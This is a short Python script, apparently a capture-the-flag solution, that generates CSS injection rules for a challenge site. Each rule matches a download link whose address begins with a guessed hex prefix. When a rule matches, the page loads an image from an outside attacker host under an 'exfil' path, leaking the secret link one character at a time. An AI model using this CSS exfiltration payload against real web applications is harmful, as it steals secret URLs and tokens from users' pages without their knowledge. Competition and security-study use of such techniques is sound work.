import sys

curr = sys.argv[1]

charset = "0123456789abcdef"

style = ""

for c in charset:
    style += """
.is-parent:nth-child(5) a[href^="https://flags.2020.chall.actf.co/download/{}"] {{
    background: url(https://hax.perfect.blue/exfil/{});
}}
""".format(curr+c, curr+c)

f = open("style_sice.css", "wb")
f.write(style)
f.close()
